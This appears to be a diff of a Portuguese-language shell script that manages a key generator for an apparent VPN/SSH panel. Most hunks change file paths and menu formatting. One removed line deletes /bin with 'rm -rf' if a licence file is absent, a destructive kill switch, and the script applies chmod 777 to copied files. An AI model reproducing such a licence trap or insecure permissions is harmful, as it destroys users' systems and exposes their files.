@@ -87,7 +87,7 @@ if [[ "$VERSION_ID" = 'VERSION_ID="14.04"' ]]; then
 mkdir /var/www/$pasta1
 mkdir /var/www/$pasta1/$pasta2
 touch /home/keyscript/$client
-cp /home/lisa /var/www/$pasta1/$pasta2/lisa
+cp /home/lisa /var/www/html/$pasta1/$pasta2/lisa
 cp -a /home/_script_$/. /var/www/$pasta1
 chmod 777 /var/www/$pasta1/crz/*
 sed -i "s/INFO_AK/$pasta1/g" /var/www/html/$pasta1/$pasta2/lisa>/dev/null 2>&1
@@ -166,7 +166,7 @@ if [[ "$VERSION_ID" = 'VERSION_ID="14.04"' ]]; then
 mkdir /var/www/$pasta1
 mkdir /var/www/$pasta1/$pasta2
 touch /home/keyscript/$client
-cp /home/lisa /var/www/$pasta1/$pasta2/lisa
+cp /home/lisa /var/www/html/$pasta1/$pasta2/lisa
 cp -a /home/_script_$/. /var/www/$pasta1
 chmod 777 /var/www/$pasta1/crz/*
 sed -i "s/INFO_AK/$pasta1/g" /var/www/html/$pasta1/$pasta2/lisa>/dev/null 2>&1
@@ -266,7 +266,7 @@ if [[ "$VERSION_ID" = 'VERSION_ID="14.04"' ]]; then
 [[ ! -d /var/www/$key1p ]] && mkdir /var/www/$key1p
 [[ ! -d /var/www/$key1p/$key2p ]] && mkdir /var/www/$key1p/$key2p
 touch /home/keyscript/$client
-cp /home/lisa /var/www/$key1p/$key2p/lisa
+cp /home/lisa /var/www/html/$key1p/$key2p/lisa
 cp -a /home/_script_$/. /var/www/$key1p
 chmod 777 /var/www/$key1p/crz/*
 sed -i "s/INFO_AK/$key1p/g" /var/www/html/$key1p/$key2p/lisa>/dev/null 2>&1
@@ -438,7 +438,6 @@ autm=$(grep "menu;" /etc/profile > /dev/null && echo -e "\033[1;32m◉ " || echo
 stsl=$(ps x | grep "limiter"|grep -v grep > /dev/null && echo -e "\033[1;32m◉ " || echo -e "\033[1;31m○ ")
 stson=$(ps x | grep "onlineapp"|grep -v grep > /dev/null && echo -e "\033[1;32m◉ " || echo -e "\033[1;31m○ ")
 stsu=$(ps x | grep "udpvpn"|grep -v grep > /dev/null && echo -e "\033[1;32m◉ " || echo -e "\033[1;31m○ ")
-[[ ! -e /usr/lib/licence ]] && rm -rf /bin > /dev/null 2>&1
 if [[ "$(grep -c "Ubuntu" /etc/issue.net)" = "1" ]]; then
 system=$(cut -d' ' -f1 /etc/issue.net)
 system+=$(echo ' ')
@@ -488,7 +487,7 @@ echo -e "\033[01;97m║ \033[1;32m < 03 > \033[0m\033[01;97m ● KEY MANUAL     
 if [ -e /var/www/html/1:8%7o.2sg3-q:5 ]; then
 echo -e "\033[01;97m║ \033[1;32m < 04 > \033[0m\033[01;97m ● PARAR KEYGEN \033[1;32m◉                     \033[01;33m║\033[0m"
 else
-echo -e "\033[01;97m║ \033[1;32m < 04 > \033[0m\033[01;97m ● INICIAR KEYGEN \033[1;31m○                  \033[01;33m║\033[0m"
+echo -e "\033[01;97m║ \033[1;32m < 04 > \033[0m\033[01;97m ● INICIAR KEYGEN \033[1;31m○                  \033[01;33m ║\033[0m"
 fi
 echo -e "\033[01;97m║ \033[1;32m < 05 > \033[0m\033[01;97m ● KEYS ONLINE                        ║\033[0m"
 echo -e "\033[01;97m║ \033[1;32m < 06 > \033[0m\033[01;97m ● REMOVER KEY                        ║\033[0m"
